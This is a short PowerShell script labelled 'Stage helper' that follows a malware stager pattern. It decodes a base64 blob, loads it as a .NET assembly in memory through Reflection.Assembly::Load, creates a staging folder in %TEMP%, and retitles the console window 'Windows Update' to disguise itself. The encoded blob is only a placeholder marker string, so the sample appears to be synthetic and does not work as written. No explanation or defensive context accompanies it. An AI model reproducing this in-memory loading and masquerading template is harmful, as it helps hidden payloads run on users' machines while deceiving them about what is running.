# Stage helper
$StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpjN213NTNqaGE0')
Write-Verbose ("Assembly bytes: " + $StageBytes.Length)
[Reflection.Assembly]::Load($StageBytes)
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$Host.UI.RawUI.WindowTitle = "Windows Update"
